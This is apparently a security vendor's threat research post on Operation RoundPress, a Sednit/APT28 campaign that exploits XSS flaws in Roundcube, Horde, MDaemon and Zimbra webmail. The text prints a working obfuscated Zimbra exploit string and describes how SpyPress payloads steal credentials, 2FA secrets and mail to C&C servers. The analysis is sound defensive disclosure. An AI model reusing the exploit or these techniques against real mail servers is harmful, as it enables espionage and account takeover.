                    <div class="article-body">
    <p>This blogpost introduces an operation that we named RoundPress, targeting high-value webmail servers with XSS vulnerabilities, and that we assess with medium confidence is run by the Sednit cyberespionage group. The ultimate goal of this operation is to steal confidential data from specific email accounts.</p>
<blockquote>
<div><strong>Key points of this blogpost:</strong></div>
<ul>
<li>In Operation RoundPress, the compromise vector is a spearphishing email leveraging an XSS vulnerability to inject malicious JavaScript code into the victim&rsquo;s webmail page.</li>
<li>In 2023, Operation RoundPress only targeted Roundcube, but in 2024 it expanded to other webmail software including Horde, MDaemon, and Zimbra.</li>
<li>For MDaemon, Sednit used a zero-day XSS vulnerability. We reported the vulnerability to the developers on November 1<sup>st</sup>, 2024 and it was patched in version 24.5.1.</li>
<li>Most victims are governmental entities and defense companies in Eastern Europe, although we have observed governments in Africa, Europe, and South America being targeted as well.</li>
<li>We provide an analysis of the JavaScript payloads SpyPress.HORDE, SpyPress.MDAEMON, SpyPress.ROUNDCUBE, and SpyPress.ZIMBRA.</li>
<li>These payloads are able to steal webmail credentials, and exfiltrate contacts and email messages from the victim&rsquo;s mailbox.</li>
<li>Additionally, SpyPress.MDAEMON is able to set up a bypass for two-factor authentication.</li>
</ul>
</blockquote>
<h2>Sednit profile</h2>
<p>The Sednit group &ndash; also known as APT28, Fancy Bear, Forest Blizzard, or Sofacy &ndash; has been operating since at least 2004. The US Department of Justice named the group as one of those responsible for the Democratic National Committee (DNC) hack just before the 2016 US elections and linked the group to the GRU. The group is also presumed to be behind the hacking of global television network TV5Monde, the World Anti-Doping Agency (WADA) email leak, and many other incidents. Sednit has a diversified set of malware tools in its arsenal, several examples of which we have documented previously in our Sednit <a href="https://web-assets.esetstatic.com/wls/2016/10/eset-sednit-part1.pdf" target="_blank" rel="noopener">white paper</a> from 2016.</p>
<h2>Links to Sednit</h2>
<p>On September 29<sup>th</sup>, 2023, we detected a spearphishing email, part of Operation RoundPress, sent from <span style="font-family: courier new, courier, monospace;">katecohen1984@portugalmail[.]pt</span> (envelope-from address). The email exploited <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43770" target="_blank" rel="noopener">CVE‑2023‑43770</a> in Roundcube. This email address is very similar to the ones used in other Sednit campaigns in 2023, as documented by <a href="https://unit42.paloaltonetworks.com/russian-apt-fighting-ursa-exploits-cve-2023-233397/" target="_blank" rel="noopener">Unit42</a> for example.</p>
<p>Leveraging a network scan we ran in February 2022, we found the server <span style="font-family: courier new, courier, monospace;">45.138.87[.]250</span> / <span style="font-family: courier new, courier, monospace;">ceriossl[.]info</span>, which was configured in the same unique way as <span style="font-family: courier new, courier, monospace;">77.243.181[.]238</span> / <span style="font-family: courier new, courier, monospace;">global-world-news[.]net</span>. The former was mentioned in a <a href="https://ti.qianxin.com/blog/articles/Analysis-of-In-the-wild-Attack-Samples-Exploiting-Outlook-Privilege-Escalation-Vulnerability-(CVE-2023-23397)-EN/" target="_blank" rel="noopener">Qianxin</a> blogpost describing a campaign abusing <a href="https://nvd.nist.gov/vuln/detail/cve-2023-23397" target="_blank" rel="noopener">CVE-2023-23397</a> that attributed it to Sednit. The latter is a domain used in Operation RoundPress in 2023.</p>
<p>Given these two elements, we believe with medium confidence that Operation RoundPress is carried out by Sednit.</p>
<h2>Victimology</h2>
<p>Table 1 and Figure 1 detail targets of Operation RoundPress in 2024, from ESET telemetry and two samples on VirusTotal.</p>
<p>Most of the targets are related to the current war in Ukraine; they are either Ukrainian governmental entities or defense companies in Bulgaria and Romania. Notably, some of these defense companies are producing Soviet-era weapons to be sent to Ukraine.</p>
<p>Other targets include African, EU, and South American governments.</p>

<h2>Compromise chain</h2>
<h3>Initial access</h3>
<p>In 2023, Sednit was exploiting <a href="https://www.cve.org/CVERecord?id=CVE-2020-35730" target="_blank" rel="noopener">CVE-2020-35730</a>, a known XSS vulnerability in Roundcube (see this CERT-UA <a href="https://cert.gov.ua/article/4905829" target="_blank" rel="noopener">blogpost</a> and this Recorded Future <a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-0620.pdf" target="_blank" rel="noopener">report</a>), which enables the loading of arbitrary JavaScript code in the context of the webmail window.</p>
<p>In 2024, we observed different XSS vulnerabilities being used to target additional webmail software: <a href="https://www.horde.org/apps/webmail" target="_blank" rel="noopener">Horde</a>, <a href="https://mdaemon.com/pages/mdaemon-email-server" target="_blank" rel="noopener">MDaemon</a>, and <a href="https://www.zimbra.com/">Zimbra</a>. Sednit also started to use a more recent vulnerability in Roundcube, <a href="https://www.cve.org/CVERecord?id=CVE-2023-43770" target="_blank" rel="noopener">CVE-2023-43770</a>. The MDaemon vulnerability (<a href="https://www.cve.org/CVERecord?id=CVE-2024-11182" target="_blank" rel="noopener">CVE-2024-11182</a>, now patched) was a zero day, most likely discovered by Sednit, while the ones for Horde, Roundcube, and Zimbra were already known and patched.</p>
<p>Sednit sends these XSS exploits by email. The exploits lead to the execution of malicious JavaScript code in the context of the webmail client web page running in a browser window. Therefore, only data accessible from the victim&rsquo;s account can be read and exfiltrated.</p>
<p>Note that, in order for the exploit to work, the target must be convinced to open the email message in the vulnerable webmail portal. This means that the email needs to bypass any spam filtering and the subject line needs to be convincing enough to entice the target into reading the email message.</p>
<p>Figure 2 summarizes the compromise chain used in Operation RoundPress.</p>
<figure class="image"><img title="Figure 2. Operation RoundPress compromise chain" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-2.png" alt="Figure 2. Operation RoundPress compromise chain" width="" height="" />

<p>Generally, the email message looks benign and contains text about news events. For example, on September 11<sup>th</sup>, 2024, a Ukrainian target received a phishing email from <span style="font-family: courier new, courier, monospace;">kyivinfo24@ukr[.]net</span> with the subject <span style="font-family: courier new, courier, monospace;">СБУ схопила банкіра, який працював на ворожу воєнну розвідку в Харкові</span> (machine translation: SBU arrested a banker who worked for enemy military intelligence in Kharkiv). The message body &ndash; see Figure 3 &ndash; contains excerpts (in Ukrainian) and links to articles from Kyiv Post, a well-known newspaper in Ukraine. The malicious code that triggers the XSS vulnerability is inside the HTML code of the email message&rsquo;s body and is not directly visible to the user.</p>
<figure class="image"><img title="Figure 3. Malicious email message sent by Sednit" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-3.png" alt="Figure 3. Malicious email message sent by Sednit" width="" height="" />

The message body &ndash; see Figure 4 &ndash; again contains excerpts (in Bulgarian) and links to articles from News.bg, a legitimate Bulgarian newspaper.</p>
<figure class="image"><img title="Figure 4. Another malicious email sent by Sednit" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-4.png" alt="Figure 4. Another malicious email sent by Sednit" width="" height="" />

<p>Note that some of these <span style="font-family: courier new, courier, monospace;">vulnerabilities</span> are not of interest exclusively to this group: GreenCube (also known as UNC3707) and <a href="https://www.welivesecurity.com/en/eset-research/winter-vivern-exploits-zero-day-vulnerability-roundcube-webmail-servers/" target="_blank" rel="noopener">Winter Vivern</a> have been exploiting them as well.</p>
<h4>Horde: Unknown exploit</h4>
<p>For targets using Horde webmail, we have seen Sednit using an old vulnerability. We were unable to find the exact vulnerability, but it appears to be an XSS flaw that was already fixed in the first version of <a href="https://github.com/horde/Text_Filter/blob/c4fcc27a5a725ceec76e477e6892521834953082/lib/Horde/Text/Filter/Xss.php" target="_blank" rel="noopener">Xss.php</a> committed to GitHub, and in <a href="http://ftp.horde.org/horde-webmail/" target="_blank" rel="noopener">Horde Webmail 1.0</a>, which was released in 2007.</p>
<p>The intended exploit used by Sednit is shown in <!-- [if supportFields]><span style='mso-element:

Thus, we believe that Sednit made a mistake and tried to use a nonworking exploit.</p>
<h4>MDaemon: CVE-2024-11182</h4>
<p>On November 1<sup>st</sup>, 2024, we detected an email message sent to two Ukrainian state-owned defense companies and a Ukrainian civil air transport company.</p>
<p>This message exploited a zero-day XSS vulnerability in <a href="https://mdaemon.com/pages/mdaemon-email-server">MDaemon Email Server</a>, in the rendering of untrusted HTML code in email messages. We reported the vulnerability to the developers on November 1<sup>st</sup>, 2024 and it was patched in <a href="https://mdaemon.com/pages/downloads-critical-updates">version 24.5.1</a>, which was released on November 14<sup>th</sup>, 2024; we then issued <a href="https://www.cve.org/CVERecord?id=CVE-2024-11182">CVE-2024-11182</a> for it.</p>
<p>The exploit used by Sednit is shown in Figure 6. Just as for Horde, it relies on a specially crafted <span style="font-family: courier new, courier, monospace;">img</span> element, but uses a bug in the MDaemon HTML parser where a <span style="font-family: courier new, courier, monospace;">noembed</span> end tag inserted within the <span style="font-family: courier new, courier, monospace;">title</span> attribute of a <span style="font-family: courier new, courier, monospace;">p</span> element tricks the parser into rendering the immediately succeeding <span style="font-family: courier new, courier, monospace;">img</span> tag.</p>

<h4>Roundcube: CVE-2023-43770</h4>
<p>For targets using Roundcube webmail: in 2023, Sednit used the XSS vulnerability <a href="https://www.cve.org/CVERecord?id=CVE-2020-35730" target="_blank" rel="noopener">CVE‑2020‑35730</a>, while in 2024, it switched to <a href="https://www.cve.org/CVERecord?id=CVE-2023-43770" target="_blank" rel="noopener">CVE-2023-43770</a>.</p>
<p>The more recent vulnerability was patched on September 14<sup>th</sup>, 2023 in <a href="https://github.com/roundcube/roundcubemail/commit/16ee6865cae8acaa048e234faa1bf9b2704e8c28" target="_blank" rel="noopener">this GitHub commit</a>. The fix is in a regex in the <span style="font-family: courier new, courier, monospace;">rcube_string_replacer.php</span> script. The exploit used by Sednit is quite simple and is depicted in Figure 7.</p>
<figure class="image"><img title="Figure 7. Exploit for CVE-2023-43770 in Roundcube" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-7.png" alt="Figure 7. Exploit for CVE-2023-43770 in Roundcube" width="" height="" />
<figcaption><em>Figure 7. Exploit for CVE-2023-43770 in Roundcube</em></figcaption>
</figure>
<p>In <span style="font-family: courier new, courier, monospace;">rcube_string_replacer.php</span>, URLs are converted to hyperlinks, and the hyperlink text is what is expected to be provided between the outer set of square brackets. The bug lies in the fact that the hyperlink text is not properly sanitized, allowing the characters <span style="font-family: courier new, courier, monospace;">&lt;</span> and <span style="font-family: courier new, courier, monospace;">&gt;</span>. This enables an attacker to provide JavaScript code contained between <span style="font-family: courier new, courier, monospace;">&lt;script&gt;</span> and <span style="font-family: courier new, courier, monospace;">&lt;/script&gt;</span>, which is directly added to the page when the email is rendered in Roundcube.</p>
<h4>Zimbra: CVE-2024-27443 / ZBUG-3730</h4>
<p>For Zimbra, Sednit uses <a href="https://www.cve.org/CVERecord?id=CVE-2024-27443">CVE-2024-27443</a> (also tracked as ZBUG-3730). It was patched on March 1<sup>st</sup>, 2024 in this <a href="https://github.com/Zimbra/zm-web-client/commit/81c6e8567b1b0f767e466084fb4de0a19a76e505">GitHub commit</a>, in the <span style="font-family: courier new, courier, monospace;">ZmInviteMsgView.js</span> file. The vulnerability lies in failing to sanitize the <span style="font-family: courier new, courier, monospace;">cif</span> (calendar intended for) attribute, in a calendar invitation sent by email.</p>
<p>The <span style="font-family: courier new, courier, monospace;">cif</span> attribute is populated from the email header <span style="font-family: courier new, courier, monospace;">X-Zimbra-Calendar-Intended-For</span>. Before the patch, the value was directly added to the Zimbra HTML page without sanitization. This allowed the execution of malicious JavaScript code in the context of the webmail browser window.</p>
<p>The exploit code that we found in this header is the following:</p>
<blockquote>
<div><span style="font-family: courier new, courier, monospace;">Zimbra Calendar&lt;img/alt=''/src='Zimbra-Calendar'/onerror=\"window[(function(tmz){ghwa='cxe';return '\\x65'+decodeURI('%76')+'\\x61\\x6c'})()](window[(function(jvqka){const kqd=decodeURI('%61')+'\t'+decodeURI('%6F')+'\\x62'; oykbg='doix'; return kqd})()](frames[0].document.getElementById('a-cashed-skinLayout2')['\inn\e\r\T\e\xt']))\"&gt;</span></div>
</blockquote>
<p>The beautified code contained in the <span style="font-family: courier new, courier, monospace;">onerror</span> attribute is:</p>
<blockquote>
<div><span style="font-family: courier new, courier, monospace;">window['eval'](window[(function(jvqka){'atob'()](frames[0].document.getElementById('a-cashed-skinLayout2')['innerText']))</span></div>
</blockquote>
<p>Basically, this reads the text contained in a <span style="font-family: courier new, courier, monospace;">div</span> element, identified by ID <span style="font-family: courier new, courier, monospace;">a-cashed-skinLayout2</span>, that is present in the body of the calendar invite. This <span style="font-family: courier new, courier, monospace;">div</span> element uses the <span style="font-family: courier new, courier, monospace;">style</span> attribute with the value <span style="font-family: courier new, courier, monospace;">display:none</span> so that it is not visible to the target. The inner text contains base64-encoded JavaScript code that is run using eval.</p>
<h3>Persistence</h3>
<p>The JavaScript payloads (SpyPress) loaded by the XSS vulnerabilities don&rsquo;t have true persistence, but they are reloaded every time the victim opens the malicious email.</p>
<p>In addition, we detected a few SpyPress.ROUNDCUBE payloads that have the ability to create <a href="https://datatracker.ietf.org/doc/html/rfc5228.html">Sieve rules</a>. SpyPress.ROUNDCUBE creates a rule that will send a copy of every incoming email to an attacker-controlled email address. Sieve rules are a feature of Roundcube and therefore the rule will be executed even if the malicious script is no longer running.</p>
<h3>Credential access</h3>
<p>All SpyPress payloads have the ability to steal webmail credentials by trying to trick the browser or password manager to fill webmail credentials into a hidden form. In addition, some samples also try to trick the victim by logging them out of their webmail account and displaying a fake login page.</p>
<h3>Collection and exfiltration</h3>
<p>Most SpyPress payloads collect email messages and contact information from the victim&rsquo;s mailbox. The data is then exfiltrated via an HTTP POST request to a hardcoded C&amp;C server.</p>
<h2>Toolset</h2>
<p>In 2024, we have observed Sednit using four payloads in Operation RoundPress: SpyPress.HORDE, SpyPress.MDAEMON, SpyPress.ROUNDCUBE, and SpyPress.ZIMBRA. They are injected into the victims&rsquo; webmail context using XSS vulnerabilities, as explained above.</p>
<p>The four payloads have common characteristics. All are similarly obfuscated, with variable and function names replaced with random-looking strings &ndash; see Figure 8. Furthermore, strings used by the code, such as webmail and C&amp;C server URLs, are also obfuscated and contained in an encrypted list. Each of those strings is only decrypted when it is used. Note that the variable and function names are randomized for each sample, so the final SpyPress payloads will have different hashes.</p>
<figure class="image"><img title="Figure 8. Obfuscation of the JavaScript code" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-8.png" alt="Figure 8. Obfuscation of the JavaScript code" width="" height="" />
<figcaption><em>Figure 8. Obfuscation of the JavaScript code</em></figcaption>
</figure>
<p>Another common characteristic is that there are no persistence or update mechanisms. The payload is fully contained in the email and only executed when the email message is viewed from a vulnerable webmail instance.</p>
<p>Finally, all payloads communicate with their hardcoded C&amp;C servers via HTTP POST requests. There is a small number of C&amp;C servers that are shared by all payloads (there is no separation by victim or payload type).</p>
<h3>SpyPress.HORDE</h3>
<p>SpyPress.HORDE is the JavaScript payload injected into vulnerable Horde webmail instances. Once deobfuscated, and functions and variables are manually renamed, it reveals its main functionality: collecting and exfiltrating user credentials.</p>
<h4>Capabilities</h4>
<p>To steal credentials, as shown in Figure 9, SpyPress.HORDE creates two HTML <span style="font-family: courier new, courier, monospace;">input</span> elements: <span style="font-family: courier new, courier, monospace;">horde_user</span> and <span style="font-family: courier new, courier, monospace;">horde_pass</span>. Their width and opacity are set to <span style="font-family: courier new, courier, monospace;">0%</span>, ensuring that they are not visible to the user. The goal is to trick browsers and password managers into filling those values. Note that a callback for the <span style="font-family: courier new, courier, monospace;">change</span> event is created on the input <span style="font-family: courier new, courier, monospace;">horde_pass</span>. This calls the function <span style="font-family: courier new, courier, monospace;">input_password_on_change</span> as soon as the input element loses focus after its value is changed.</p>
<figure class="image"><img title="Figure 9. SpyPress.HORDE credential stealer" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-9.png" alt="Figure 9. SpyPress.HORDE credential stealer" width="" height="" />
<figcaption><em>Figure 9. SpyPress.HORDE credential stealer</em></figcaption>
</figure>
<p>Then, <span style="font-family: courier new, courier, monospace;">input_password_on_change</span> exfiltrates the data by calling <span style="font-family: courier new, courier, monospace;">C2_POST_Request</span>, as can be seen in Figure 10.</p>
<h4>Network protocol</h4>
<p>The C&amp;C URL is hardcoded in the script (see Figure 10) and the exfiltration is done via an HTTPS POST request.</p>
<p>The body data has a specific format that is sent base64 encoded. For example, <span style="font-family: courier new, courier, monospace;">bWVAdmljdGltLm9yZyA6OiBweAoKbXl1c2VybmFtZSBteXBhc3N3b3Jk</span> decodes to:</p>
<blockquote>
<div><span style="font-family: courier new, courier, monospace;">me@victim.org :: px</span></div>
<div>&nbsp;</div>
<div><span style="font-family: courier new, courier, monospace;">myusername mypassword</span></div>
</blockquote>
<p>where <span style="font-family: courier new, courier, monospace;">px</span> probably means password exfiltration.</p>
<p>Note that the HTTP request is made by the victim&rsquo;s browser, so HTTP headers such as the User-Agent will vary from victim to victim.</p>
<figure class="image"><img title="Figure 10. SpyPress.HORDE data exfiltration" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-10.png" alt="Figure 10. SpyPress.HORDE data exfiltration" width="" height="" />

<h3>SpyPress.MDAEMON</h3>
<p>SpyPress.MDAEMON is a JavaScript payload injected into vulnerable MDaemon webmail instances. Once deobfuscated, it reveals more functionality than what was implemented in SpyPress.HORDE:</p>
<ul>
<li>credential stealing (very similar to the SpyPress.HORDE implementation),</li>
<li>exfiltration of contacts and login history,</li>
<li>exfiltration of email messages,</li>
<li>exfiltration of the two-factor authentication secret, and</li>
<li>creation of an <a href="https://help.mdaemon.com/mdaemon/en/ae_app_passwords.html">App Password</a>, which enables attackers to access the mailbox from a mail application and to bypass 2FA protection.</li>
</ul>
<h4>Capabilities</h4>
<h5>Credential stealer</h5>
<p>The credential stealer of SpyPress.MDAEMON is almost identical to that of SpyPress.HORDE &ndash; see Figure 11. The only difference is the name of the input fields, which are <span style="font-family: courier new, courier, monospace;">User</span> and <span style="font-family: courier new, courier, monospace;">Password</span>, to match the official names used in the MDaemon software.</p>
<figure class="image"><img title="Figure 11. SpyPress.MDAEMON credential stealer" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-11.png" alt="Figure 11. SpyPress.MDAEMON credential stealer" width="" height="" />
<figcaption><em>Figure 11. SpyPress.MDAEMON credential stealer</em></figcaption>
</figure>
<h5>Contacts and login history</h5>
<p>SpyPress.MDAEMON obtains the victim&rsquo;s login history from <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/WorldClient.dll?Session=&lt;session_ID&gt;&amp;View=Options-Authentication&amp;GetLoginHistory=Yes</span>, and exfiltrates the content to the hardcoded C&amp;C server. It uses the same function used in the credential stealer part to send an HTTP POST request to the C&amp;C server, but instead of <span style="font-family: courier new, courier, monospace;">px</span>, it uses ab as the message type.</p>
<p>Then, as shown in Figure 12, the script obtains the victim&rsquo;s contact list from <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/WorldClient.dll?Session=&lt;session_ID&gt;&amp;View=Contacts</span>. This list, and the associated email addresses (in the <span style="font-family: courier new, courier, monospace;">eml</span> JavaScript property), are then exfiltrated to the C&amp;C server.</p>
<figure class="image"><img title="Figure 12. Exfiltration of login history and contacts" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-12.png" alt="Figure 12. Exfiltration of login history and contacts" width="" height="" />
<figcaption><em>Figure 12. Exfiltration of login history and contacts</em></figcaption>
</figure>
<h5>Email message exfiltration</h5>
<p>SpyPress.MDAEMON browses the victim&rsquo;s mailbox folders, as shown in Figure 13, and filters out a hardcoded list of folders the attackers are not interested in: <span style="font-family: courier new, courier, monospace;">calendar</span>, <span style="font-family: courier new, courier, monospace;">notes</span>, <span style="font-family: courier new, courier, monospace;">documents</span>, <span style="font-family: courier new, courier, monospace;">contacts</span>, <span style="font-family: courier new, courier, monospace;">tasks</span>, <span style="font-family: courier new, courier, monospace;">allowed senders</span>, and <span style="font-family: courier new, courier, monospace;">blocked senders</span>.</p>
<figure class="image"><img title="Figure 13. SpyPress.MDAEMON browses the victim&rsquo;s mailbox folders" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-13.png" alt="Figure 13. SpyPress.MDAEMON browses the victim&rsquo;s mailbox folders" width="" height="" />
<figcaption><em>Figure 13. SpyPress.MDAEMON browses the victim&rsquo;s mailbox folders</em></figcaption>
</figure>
<p>Then, for each folder, as shown in Figure 14, SpyPress.MDAEMON iterates over the pages and then over all messages in each page, before exfiltrating each email to the C&amp;C server.</p>
<p>To get a list of email messages in a given folder page, SpyPress.MDAEMON fetches <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/WorldClient.dll?Session=&lt;session_ID&gt;&amp;View=List&amp;ReturnJavaScript=1&amp;FolderID=&lt;folder_ID&gt;&amp;Sort=RevDate&amp;Page=&lt;page&gt;&amp;UTF8=1</span>.</p>
<p>Then, it iterates over this list and fetches <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/WorldClient.dll?Session=&lt;session_ID&gt;&amp; View=Message&amp;Source=Yes&amp;Number=&lt;email_ID&gt;&amp;FolderId=&lt;folder_ID&gt;</span> to get the source of each email.</p>
<p>Finally, the email source is exfiltrated via an HTTP POST request to the C&amp;C server, using the message type <span style="font-family: courier new, courier, monospace;">mail-&lt;folder_name&gt;-&lt;email_ID&gt;</span>. An HTTP POST request is made for each exfiltrated email, and thus it will create a large amount of network traffic.</p>
<p>Note that the script maintains a list of exfiltrated emails, thereby avoiding the exfiltration several times.</p>
<figure class="image"><img title="Figure 14. SpyPress.MDAEMON exfiltrates all emails" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-14.png" alt="Figure 14. SpyPress.MDAEMON exfiltrates all emails" width="" height="" />
<figcaption><em>Figure 14. SpyPress.MDAEMON exfiltrates all emails</em></figcaption>
</figure>
<p>Also note that the obfuscator seems to have introduced errors in the script. In the function <span style="font-family: courier new, courier, monospace;">download_all_messages_from_folder, is_folder_limit</span> is a real variable name that was left unobfuscated. However, it is not used anywhere in the code.</p>
<h5>Two-factor authentication secret</h5>
<p>SpyPress.MDAEMON exfiltrates the victim&rsquo;s two-factor authentication secret &ndash; see Figure 15. It first fetches <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/WorldClient.dll?Session=&lt;session_ID&gt;&amp;View=Options-Authentication&amp;TwoFactorAuth=Yes&amp;GetSecret=Yes</span> to get the secret, and then sends it to the C&amp;C server, using the message type <span style="font-family: courier new, courier, monospace;">2fa</span>.</p>
<p>To view the secret, the password is required, which SpyPress.MDAEMON gets from the fake login form it created. This secret is equivalent to the QR code mentioned in <a href="https://knowledge.mdaemon.com/enable-two-factor-authentication-webmail-remote-administration" target="_blank" rel="noopener">MDaemon documentation</a> and it can be used to register the account in an authentication app, to then generate a valid 2FA code for the victim&rsquo;s account. Because SpyPress.MDAEMON acquires the password and the 2FA secret, attackers will be able to log into the account directly.</p>
<figure class="image"><img title="Figure 15. SpyPress.MDAEMON exfiltrates the 2FA secret" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-15.png" alt="Figure 15. SpyPress.MDAEMON exfiltrates the 2FA secret" width="" height="" />
<figcaption><em>Figure 15. SpyPress.MDAEMON exfiltrates the 2FA secret</em></figcaption>
</figure>
<h5>App Password creation</h5>
<p>In addition to stealing the 2FA secret, SpyPress.MDAEMON creates an App Password (see the <a href="https://knowledge.mdaemon.com/app-passwords">documentation</a>). This password can be used in an email client to send and receive messages, without having to enter the 2FA code, even if 2FA is activated for the account. Note that MDaemon webmail doesn&rsquo;t seem to require a 2FA code to generate a new application password.</p>
<p>As shown in Figure 16, SpyPress.MDAEMON fetches <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/WorldClient.dll?Session=&lt;session_ID&gt;&amp;View=Options-Authentication&amp;CreateAppPassword=1s</span> to create a new application password. The reply is this password, which is exfiltrated to the C&amp;C server with the message type <span style="font-family: courier new, courier, monospace;">create-app</span>.</p>
<p>In other words, this application password enables attackers to add the email account directly to their own email client. They can thereby keep access to the mailbox even if the main password of the victim&rsquo;s account is changed or if the 2FA code is changed.</p>
<figure class="image"><img title="Figure 16. SpyPress.MDAEMON creates an application password" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-16.png" alt="Figure 16. SpyPress.MDAEMON creates an application password" width="" height="" />
<figcaption><em>Figure 16. SpyPress.MDAEMON creates an application password</em></figcaption>
</figure>
<h4>Network protocol</h4>
<p>SpyPress.MDAEMON uses the same network protocol as SpyPress.HORDE.</p>
<h3>SpyPress.ROUNDCUBE</h3>
<p>SpyPress.ROUNDCUBE is the JavaScript payload injected into vulnerable Roundcube webmail instances. Once deobfuscated, it reveals similar functionalities to what is implemented in SpyPress.MDAEMON:</p>
<ul>
<li>credential stealing,</li>
<li>exfiltration of the address book and the about page,</li>
<li>exfiltration of emails, and</li>
<li>malicious Sieve rules.</li>
</ul>
<h4>Capabilities</h4>
<h5>Credential stealer</h5>
<p>The credential stealer of SpyPress.ROUNDCUBE has two features. The first one is almost identical to the credential stealer of SpyPress.HORDE and SpyPress.MDAEMON. The only difference is the name of the input fields, which are <span style="font-family: courier new, courier, monospace;">_user</span> and <span style="font-family: courier new, courier, monospace;">_pass</span>, to match the official names used in the Roundcube software.</p>
<p>The second feature is slightly more intrusive. SpyPress.ROUNDCUBE creates an iframe, as shown in Figure 17, with the <span style="font-family: courier new, courier, monospace;">src</span> attribute set to <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/?_task=logout&amp;_token=&lt;CSRF_token&gt;</span>. This logs the victim out, forcing them to reenter their credentials. SpyPress.ROUNDCUBE adds a callback on the submit button of the genuine login form. Finally, the credentials are exfiltrated to the hardcoded C&amp;C server using the message type <span style="font-family: courier new, courier, monospace;">pax-fish</span>.</p>
<figure class="image"><img title="Figure 17. SpyPress.ROUNDCUBE creates an iframe to log out the victim" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-17.png" alt="Figure 17. SpyPress.ROUNDCUBE creates an iframe to log out the victim" width="" height="" />
<figcaption><em>Figure 17. SpyPress.ROUNDCUBE creates an iframe to log out the victim</em></figcaption>
</figure>
<p>Note that the CSRF token is retrieved from the variable <span style="font-family: courier new, courier, monospace;">rcmail.env.request_token</span>. The <span style="font-family: courier new, courier, monospace;">rcmail</span> global variable is managed and filled by the Roundcube instance, and accessible in the JavaScript context that SpyPress.ROUNDCUBE is running in.</p>
<h5>Exfiltration of the address book and the about page</h5>
<p>SpyPress.ROUNDCUBE fetches the address book at <br /><span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/?_task=addressbook&amp;_source=0&amp;_action=export&amp;&amp;_token=&lt;CSRF_token&gt;</span> and sends the raw output to the C&amp;C server.</p>
<p>Similarly, SpyPress.ROUNDCUBE fetches the about page at <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/?_task=settings&amp;_framed=1&amp;_action=about</span> and sends the raw output to the C&amp;C server.</p>
<p>That page contains information about the Roundcube version and the plugins installed, as shown in Figure 18.</p>
<figure class="image"><img title="Figure 18. Example of Roundcube about page" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-18.png" alt="Figure 18. Example of Roundcube about page" width="" height="" />
<figcaption><em>Figure 18. Example of Roundcube about page</em></figcaption>
</figure>
<h5>Email message exfiltration</h5>
<p>SpyPress.ROUNDCUBE starts the email exfiltration routine every 7,200 seconds (two hours).</p>
<p>First, it gets the list of mailboxes from the global variable <span style="font-family: courier new, courier, monospace;">rcmail.env.mailboxes</span>. Then, it iterates over all those mailboxes; for each of them, it iterates over the pages to get the email message IDs by fetching <span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/?_task=mail&amp;_action=list&amp;_mbox=&lt;mailbox_name&gt;&amp;_refresh=1&amp;_remote=1&amp;_page=&lt;current_page&gt;</span>. Note that SpyPress.ROUNDCUBE adds the HTTP header <span style="font-family: courier new, courier, monospace;">X-Roundcube-Request</span>, which contains the CSRF token.</p>
<p>Also note that there is a lower bound time hardcoded in the script, 6:02:03 am, October 1<sup>st</sup>, 2024 in the specific script sample we analyzed, and only emails more recent than this are exfiltrated.</p>
<p>The source of each email message is fetched from <br /><span style="font-family: courier new, courier, monospace;">https://&lt;webmail_URL&gt;/?_task=mail&amp;_mbox=&lt;mailbox&gt;&amp;_uid=&lt;email_ID&gt;&amp;_action=viewsource</span> and then exfiltrated to the C&amp;C server.</p>
<p>Note that if SpyPress.ROUNDCUBE has exfiltrated more than 150 emails in a row, it stops the exfiltration until the next execution of the email exfiltration routine (two hours later). This is probably done to limit the noise on the victim&rsquo;s network and avoid detection.</p>
<h5>Malicious Sieve rules</h5>
<p>In some SpyPress.ROUNDCUBE samples, there is additional functionality related to <a href="https://github.com/roundcube/roundcubemail/tree/master/plugins/managesieve" target="_blank" rel="noopener">Sieve rules</a> &ndash; see Figure 19. SpyPress.ROUNDCUBE creates a rule that sends a copy of every incoming email message to an attacker-controlled email address (<span style="font-family: courier new, courier, monospace;">srezoska@skiff[.]com</span> in this case). <a href="https://skiff.com/" target="_blank" rel="noopener">Skiff</a> was a privacy-oriented email service that provided end-to-end encryption.</p>
<figure class="image"><img title="Figure 19. SpyPress.ROUNDCUBE creates a malicious Sieve rule" src="https://web-assets.esetstatic.com/wls/2025/05-25/operation-roundpress/figure-19.png" alt="Figure 19. SpyPress.ROUNDCUBE creates a malicious Sieve rule" width="" height="" />
<figcaption><em>Figure 19. SpyPress.ROUNDCUBE creates a malicious Sieve rule</em></figcaption>
</figure>
<h4>Network protocol</h4>
<p>SpyPress.ROUNDCUBE uses the same network protocol as SpyPress.HORDE.</p>
<h3>SpyPress.ZIMBRA</h3>
<p>SpyPress.ZIMBRA is the JavaScript payload injected into vulnerable Zimbra webmail instances. Once deobfuscated, it reveals similar functionalities to the previous payloads:</p>
<ul>
<li>credential stealing,</li>
